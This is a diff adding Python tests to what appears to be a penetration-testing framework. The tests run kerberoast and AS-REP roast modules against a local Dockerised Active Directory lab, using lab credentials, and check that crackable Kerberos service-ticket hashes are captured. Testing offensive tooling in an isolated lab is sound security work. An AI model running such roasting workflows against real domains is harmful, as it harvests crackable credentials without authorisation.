@@ -511,5 +511,79 @@ class TestAdEnumLab(unittest.TestCase):
         self.assertNotIn("Traceback", out)
 
 
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+class TestRoastLab(unittest.TestCase):
+    """kerberoast + asreproast against the AD lab (has SPN + no-preauth fixtures)."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.ldap import ldap as impacket_ldap
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("ad")
+        deadline = time.time() + 120
+        while time.time() < deadline:
+            try:
+                conn = impacket_ldap.LDAPConnection("ldap://127.0.0.1")
+                conn.login("Administrator", "P@ssw0rd123", "forge.local")
+                break
+            except Exception:
+                time.sleep(2)
+        else:
+            cls.manager.down("ad")
+            raise RuntimeError("AD lab did not provision within 120s")
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("ad")
+
+    def _run(self, *commands):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in commands:
+                    console.onecmd(command)
+            return buf.getvalue(), console.store.loot("hash")
+        finally:
+            console.store.close()
+
+    def test_kerberoast_low_priv_user(self):
+        # analyst is a normal user — proof that any domain cred roasts
+        out, hashes = self._run(
+            "use auxiliary/attack/kerberoast",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERNAME analyst",
+            "set PASSWORD Summer2024!",
+            "run",
+        )
+        self.assertIn("$krb5tgs$", out)
+        self.assertIn("backup_svc", out)
+        self.assertEqual(len(hashes), 1)
+        self.assertIn("$krb5tgs$", hashes[0]["content"])
+        self.assertIn("backup_svc", hashes[0]["label"])
+
+    def test_asreproast_graceful_when_kdc_refuses(self):
+        # The Samba AD KDC in this build does not honor
+        # UF_DONT_REQUIRE_PREAUTH (or NO_AUTH_DATA_REQUIRED): it demands
+        # preauth from every account, so AS-REP roasting is impossible
+        # against it. The module must handle that cleanly: no traceback,
+        # no hashes, honest summary. (Against a Windows KDC it roasts.)
+        out, hashes = self._run(
+            "use auxiliary/attack/asreproast",
+            f"set RHOSTS {HOST}",
+            "set DOMAIN forge.local",
+            "set USERS noauth,analyst",
+            "run",
+        )
+        self.assertNotIn("Traceback", out)
+        self.assertIn("0/2 roastable", out)
+        self.assertEqual(hashes, [])
+
+
 if __name__ == "__main__":
     unittest.main()
